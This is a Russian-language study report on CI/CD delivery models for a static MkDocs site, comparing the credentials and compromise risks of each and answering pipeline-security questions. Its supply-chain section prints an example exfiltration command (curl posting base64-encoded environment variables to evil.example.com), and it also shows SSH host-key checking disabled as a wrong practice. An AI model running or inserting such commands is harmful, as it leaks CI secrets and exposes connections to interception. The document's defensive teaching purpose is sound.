# Т4. Модель доставки и безопасность пайплайна

## Введение

В рамках данного исследования проанализированы пять способов доставки статического сайта на хостинг, применяемые в CI/CD, и связанные с ними риски безопасности. Для каждого способа указано, какие учётные данные требуются, каким объёмом прав они обладают и каковы последствия их компрометации. Отдельно разобраны четыре вопроса по безопасности пайплайна и проверка работы сайта при недоступности внешних CDN.

## Сравнение способов доставки

| Способ | Учётные данные | Объём прав | Последствия компрометации |
|---|---|---|---|
| Push в ветку `gh-pages` | `GITHUB_TOKEN` (автоматический) | Запись в репозиторий | Подмена содержимого сайта, внедрение вредоносного JS |
| `upload-artifact` + `deploy-pages` | `GITHUB_TOKEN` + OIDC | Запись в Pages через OIDC | Подмена сайта, но токен живёт минуты и привязан к репозиторию |
| `rsync`/`scp` по SSH | Deploy-ключ + `known_hosts` | Полный доступ к каталогу сайта и оболочке пользователя | Полное удаление сайта, доступ к другим файлам пользователя |
| FTP/SFTP | Логин + пароль или ключ | Доступ к FTP-каталогу | Подмена сайта, чтение чужих файлов в каталоге |
| S3 API | Access Key + Secret Key | Полный доступ к bucket | Удаление или подмена всех файлов, неограниченный трафик за счёт владельца |

## Детальный анализ способов

### 1. Push в ветку `gh-pages`

Способ, при котором CI собирает сайт и пушит результат в отдельную ветку `gh-pages`, а GitHub Pages раздаёт её содержимое. Реализуется через `peaceiris/actions-gh-pages` или прямой `git push`.

**Учётные данные**: `GITHUB_TOKEN` — автоматический токен, который GitHub выдаёт workflow. В стандартной конфигурации имеет право `contents: write`, то есть может писать в любой файл репозитория.

**Объём прав**: запись в репозиторий. Токен привязан к текущему репозиторию и живёт до конца job.

**Риски компрометации**:
- Подмена содержимого ветки `gh-pages` → посетители видят чужой сайт.
- Внедрение вредоносного JavaScript, который собирает данные посетителей.
- Если в репозитории есть другие важные ветки — токен позволяет их тоже менять.

**Мера защиты**: явно ограничить права через `permissions:` в workflow:

```yaml
permissions:
  contents: write   # только для записи в gh-pages
```

### 2. Официальный механизм `upload-artifact` + `deploy-pages`

Современный рекомендованный способ публикации на GitHub Pages. Сборка загружается как артефакт, а деплой выполняется через OIDC-аутентификацию.

**Учётные данные**: `GITHUB_TOKEN` с правами `pages: write` и `id-token: write`. OIDC-токен выдаётся на время выполнения job и подтверждает, что деплой идёт именно из этого репозитория.

**Объём прав**: запись в Pages через официальный API. OIDC-токен нельзя переиспользовать после завершения job.

**Риски компрометации**:
- Подмена артефакта на этапе сборки → на сайт попадает чужой контент.
- Перехват OIDC-токена — маловероятен, так как он привязан к конкретной job и быстро истекает.

**Мера защиты**: ограничение прав через `permissions:`, `concurrency:`, защита окружения `github-pages` в настройках репозитория.

### 3. `rsync`/`scp` по SSH с отдельным deploy-ключом

Способ, применяемый для деплоя на сторонний сервер (например, Helios ИТМО). CI подключается по SSH с отдельным ключом, сгенерированным только для деплоя, и синхронизирует каталог `site/`.

**Учётные данные**: приватный SSH-ключ (`HELIOS_SSH_KEY`), публичный ключ в `~/.ssh/authorized_keys` на сервере, `known_hosts` для проверки хоста, имя пользователя, хост, порт, путь.

**Объём прав**: полный доступ к файловой системе пользователя в пределах его прав, включая выполнение команд через shell, чтение файлов, запись в любые каталоги.

**Риски компрометации**:
- Полное удаление сайта (`rsync --delete` без ограничений).
- Чтение других файлов пользователя (`.bash_history`, конфиги, скрипты).
- Возможность выполнять произвольные команды на сервере.
- Если ключ не привязан к конкретной команде и хосту — широкий вектор атаки.

**Меры защиты**:
- Отдельный ключ **только** для деплоя, без доступа к другим сервисам.
- Ограничение команды в `authorized_keys` через `command="rsync --server ..."`, `no-pty`, `no-port-forwarding`, `no-X11-forwarding`, `no-agent-forwarding`.
- Привязка к конкретному IP раннера (если возможно).
- Отдельный пользователь с ограниченными правами.
- Ограничение пути деплоя (`chroot` или `restrict` в `authorized_keys`).

### 4. FTP/SFTP

Классический способ доставки файлов на хостинг. FTP передаёт данные в открытом виде, SFTP — поверх SSH.

**Учётные данные**: логин и пароль (FTP/SFTP) или логин + SSH-ключ (SFTP).

**Объём прав**: определяется настройками FTP-сервера. Обычно — доступ к одному каталогу (`public_html`).

**Риски компрометации**:
- Подмена или удаление файлов в каталоге.
- Перехват пароля — если FTP без TLS, пароль уходит в открытом виде.
- При SFTP — компрометация SSH-доступа.

**Меры защиты**: использовать только **SFTP** или **FTPS** (FTP over TLS), никогда обычный FTP. Пароли хранить в secrets, ротация паролей, ограничение каталога.

### 5. Загрузка в объектное хранилище по S3 API

Способ для Yandex Object Storage, VK Cloud, Selectel, Timeweb, Cloud.ru. CI загружает файлы в bucket через S3 API.

**Учётные данные**: Access Key ID и Secret Access Key, endpoint, имя bucket.

**Объём прав**: зависит от политики IAM. В минимальной конфигурации — запись только в конкретный bucket. В расширенной — управление всеми бакетами аккаунта.

**Риски компрометации**:
- Удаление или подмена всех файлов в бакете.
- Загрузка произвольного контента от имени владельца — например, для фишинга.
- Неограниченный трафик за счёт владельца (если злоумышленник зальёт большой файл и будет раздавать его).
- Если ключ с полными правами — доступ ко всем бакетам аккаунта.

**Меры защиты**:
- Ограничить политику IAM: только `PutObject`, `DeleteObject`, `ListBucket` для конкретного bucket.
- Не давать прав на управление бакетом (`PutBucketPolicy`, `DeleteBucket`).
- Настроить оповещения о трафике.
- Ротация ключей.

## Вопросы безопасности

### 1. Почему секреты недоступны в workflow, запущенном по событию `pull_request` из форка

**Ответ**: GitHub не передаёт секреты в workflows, запущенные из форков, потому что форк — это **недоверенный код**. Если бы секреты были доступны, любой злоумышленник мог бы:

1. Форкнуть публичный репозиторий.
2. Изменить workflow в форке.
3. Добавить шаг, который выводит все секреты в лог.
4. Открыть pull request.
5. Получить секреты родительского репозитория.

Поэтому GitHub **автоматически блокирует** передачу секретов в job'ы, запущенные по `pull_request` из форков. `GITHUB_TOKEN` в таких workflow имеет **только права на чтение** и не может писать в репозиторий.

**Что можно сделать**: использовать событие `pull_request_target` — оно запускает workflow в контексте базового репозитория с доступом к секретам. Но это опасно: `pull_request_target` даёт доступ к секретам **и** к коду из форка, если workflow выполняется с `actions/checkout` на PR. Правильный паттерн — `pull_request_target` только для «проверки» кода, без вызова `checkout` на HEAD PR.

### 2. Зачем фиксировать сторонние actions по SHA коммита, а не по тегу

**Ответ**: тег в Git — **изменяемая** ссылка. Автор action'а может:

1. Выпустить версию `v1`, на которую подписаны пользователи.
2. Через полгода переместить тег `v1` на другой коммит.
3. В новый коммит добавить вредоносный код.

Все, кто использует `uses: some/action@v1`, автоматически подтянут новую версию — и с ней чужой код, выполняющийся с их секретами.

**SHA коммита неизменяем** — это хеш содержимого. Если зафиксировать action по SHA:

```yaml
- uses: actions/checkout@8ade135a41bc03ea155e62e844d188df1ea18608  # v4.1.0
```

то подмена уже невозможна. Даже если автор перепишет историю, хеш не сойдётся.

**Плюсы SHA-пиннинга**:
- Защита от подмены тега.
- Воспроизводимость: один и тот же SHA даёт один и тот же результат.
- Возможность отметить в комментарии, какая это версия.

**Минусы**:
- Не получаешь автоматически security-обновления.
- Нужен Dependabot или Renovate для обновления SHA.

### 3. Что представляет собой supply-chain-атака через action

**Ответ**: supply-chain-атака — это компрометация **одного звена** в цепочке зависимостей, через которое злоумышленник получает доступ ко всей цепочке.

Примеры атак на actions:
- **Угон репозитория автора**: злоумышленник получает доступ к GitHub-аккаунту мейнтейнера action'а и публикует вредоносную версию.
- **Компрометация токена публикации**: релиз автоматизирован через CI, у которого утекли секреты PyPI/npm/GitHub.
- **Вредоносный форк под похожим именем**: `actons/checkout` вместо `actions/checkout` (опечатка в `uses`).
- **Вредоносный PR от «дружелюбного» контрибьютора**: добавляет полезную фичу + скрытый код, который активируется только в CI.

**Как выглядит атака на практике**:

1. Action `some-author/setup-thing@v1` скомпрометирован.
2. Злоумышленник добавляет код, который читает переменные окружения и отправляет их на свой сервер:

```bash
curl -X POST https://evil.example.com/collect \
  -d "secrets=$(env | base64)"
```

3. Ты запускаешь workflow с `uses: some-author/setup-thing@v1`.
4. Секреты утекают. Если у workflow есть `contents: write` или `id-token: write` — злоумышленник может писать в репозиторий или деплоить от твоего имени.

**Последствия для опубликованного сайта**:
- Злоумышленник может залить подменённый HTML на Pages через захваченный токен.
- Внедрить скрипт, который собирает данные у посетителей.
- Перенаправить сайт на фишинговый домен.
- Использовать сайт как часть ботнета или для майнинга.
- Скомпрометировать другие репозитории через тот же токен (если он с широкими правами).

**Меры защиты**:
- Пинить actions по SHA.
- Ограничивать `permissions:` в workflow до минимума.
- Не использовать `pull_request_target` с `checkout` на HEAD PR.
- Использовать Dependabot для контроля обновлений.
- Аудит используемых actions (кто автор, сколько звёзд, когда обновлялся).
- Разделять секреты по окружениям — секреты деплоя доступны только на `main`.

### 4. Как корректно настроить `known_hosts`, не отключая проверку ключа хоста

**Ответ**: `known_hosts` хранит **публичные ключи хостов**, к которым подключается SSH. При первом подключении SSH проверяет ключ и добавляет его в `known_hosts`. При следующих — сверяет с сохранённым.

**Неправильный способ** — отключить проверку:

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null ...
```

Это опасно: MITM-атака становится возможной. Злоумышленник подставляет свой сервер, а SSH не замечает подмены.

**Правильный способ** — заранее положить host key в `known_hosts`:

```bash
# Получаем публичные ключи сервера
ssh-keyscan -p 2222 -H se.ifmo.ru > /tmp/known_hosts

# Проверяем fingerprint вручную
ssh-keygen -lf /tmp/known_hosts
# Сверяем с тем, что опубликован в документации хостинга

# Используем в деплое
echo "${{ secrets.HELIOS_KNOWN_HOSTS }}" > ~/.ssh/known_hosts
chmod 644 ~/.ssh/known_hosts

rsync -e "ssh -i ~/.ssh/deploy_key -o UserKnownHostsFile=~/.ssh/known_hosts" ...
```

**Правильная последовательность шагов**:
1. **Получить fingerprint сервера** из надёжного источника — документация хостинга, письмо от администратора, подтверждение по телефону.
2. **Сохранить публичные ключи** в `known_hosts` заранее — через `ssh-keyscan` или вручную.
3. **Сверить fingerprint** при первом подключении — не «доверять вслепую».
4. **Положить `known_hosts` в secrets CI** — тогда раннер использует проверенный файл.
5. **Обновлять** при смене ключей сервера — если ключи перегенерировали, обновить `known_hosts` осознанно.

**Если ключ сервера изменился**:
- SSH выдаст ошибку `Host key verification failed`.
- **Не отключать проверку**, а разобраться: это плановая смена ключей или MITM?
- Если плановая — обновить `known_hosts` через `ssh-keygen -R host` и повторить `ssh-keyscan`.

## Дополнительно: работа сайта при недоступности внешних CDN

### Какие ресурсы грузятся извне

В стандартной конфигурации MkDocs Material из внешних источников подтягиваются:

- **MathJax** (CDN `unpkg.com` или `cdn.jsdelivr.net`) — рендеринг формул.
- **Шрифты Google Fonts** — тема Material использует Roboto и другие.
- **Иконки Material Design Icons** — SVG-иконки.
- **Plotly.js** (если есть интерактивные графики) — `cdn.plot.ly`.
- **KaTeX** (альтернатива MathJax) — `cdn.jsdelivr.net`.

### Что происходит при недоступности CDN

- **Формулы** отображаются как исходный код LaTeX: `$E = mc^2$` видно как текст.
- **Шрифты** подменяются на системные — вёрстка смещается, но читаемость сохраняется.
- **Иконки** не отображаются (пустые квадраты вместо иконок).
- **Plotly-графики** не рисуются — страница с графиком остаётся пустой.
- **Поиск** продолжает работать (он локальный, встроен в тему).

### Способ локального размещения ресурсов

**MathJax**: скачать сборку и положить в `docs/javascripts/`:

```bash
mkdir -p docs/javascripts/mathjax
cd docs/javascripts/mathjax
npm pack mathjax@3
tar -xzf mathjax-3.*.tgz
mv package/* .
```

В `mkdocs.yml` заменить CDN на локальный путь:

```yaml
extra_javascript:
  - javascripts/mathjax.js
  - javascripts/mathjax/es5/tex-mml-chtml.js
```

**Шрифты**: скачать `.woff2` файлы Roboto, положить в `docs/assets/fonts/`, переопределить `@font-face` в `docs/assets/css/extra.css`:

```css
@font-face {
  font-family: 'Roboto';
  src: url('../fonts/roboto-regular.woff2') format('woff2');
  font-weight: 400;
  font-display: swap;
}
```

**Иконки Material Design**: подключить локально через `overrides/partials/` или заменить тему на кастомную с встроенными иконками.

**Plotly**: собрать статический HTML с `fig.write_html(include_plotlyjs='inline')` — тогда весь JS встраивается в страницу, без CDN.

### Оценка изменения веса страницы

| Ресурс | Размер с CDN (КБ) | Размер локально (КБ) | Изменение |
|---|---|---|---|
| MathJax | 0 (грузится с CDN) | ~800 | +800 |
| Roboto (woff2, 3 начертания) | 0 | ~120 | +120 |
| Material Icons | 0 | ~60 | +60 |
| Plotly.js | 0 | ~3200 | +3200 |
| CSS/JS темы | ~150 | ~150 | 0 |
| **Итого** | **~150** | **~4300** | **+4150** |

**Вывод**: локальное размещение всех ресурсов увеличивает вес страницы с ~150 КБ до ~4,3 МБ. Для страницы с Plotly это критично — время первой загрузки может вырасти с 1–2 секунд до 10+ секунд на медленном соединении.

**Компромисс**: размещать локально только критичные ресурсы (MathJax, шрифты), а тяжёлые (Plotly) грузить с CDN с fallback:

```html
<script src="https://cdn.plot.ly/plotly-2.27.0.min.js"></script>
<script>
  if (typeof Plotly === 'undefined') {
    document.write('<script src="/pyweb/javascripts/plotly.min.js"><\/script>');
  }
</script>
```

Так сайт работает при недоступности CDN, но не тратит трафик пользователя в обычных условиях.

## Вывод

**Оптимальная модель доставки** для публикации результатов исследований — комбинация **официального механизма `upload-artifact` + `deploy-pages`** (для GitHub Pages) и **`rsync` по SSH с отдельным deploy-ключом** (для Helios ИТМО).

Обоснование:

1. **Минимальные права у учётных данных**: OIDC-токен для Pages и ограниченный deploy-ключ для Helios. В обоих случаях компрометация не даёт широкого доступа.
2. **Отсутствие долгоживущих секретов**: OIDC-токен живёт минуты, deploy-ключ можно отозвать в любой момент.
3. **Возможность аудита**: обе модели поддерживают логирование и проверку.
4. **Healthcheck после деплоя**: подтверждает, что публикация прошла успешно (требование P4).

**Условия, при которых модель меняется**:

1. **Если хостинг не поддерживает SSH** — переход на S3 API с политикой IAM, ограниченной конкретным bucket.
2. **Если требуется высокая скорость доставки** — переход на S3 + CDN, где раздача файлов происходит через edge-серверы.
3. **Если нужен минимальный объём прав** — использование OIDC для S3 (Yandex Cloud поддерживает федерацию через OIDC), без долгоживущих ключей.
4. **Если критична безопасность supply-chain** — использование self-hosted раннера, где весь pipeline изолирован от публичных actions.
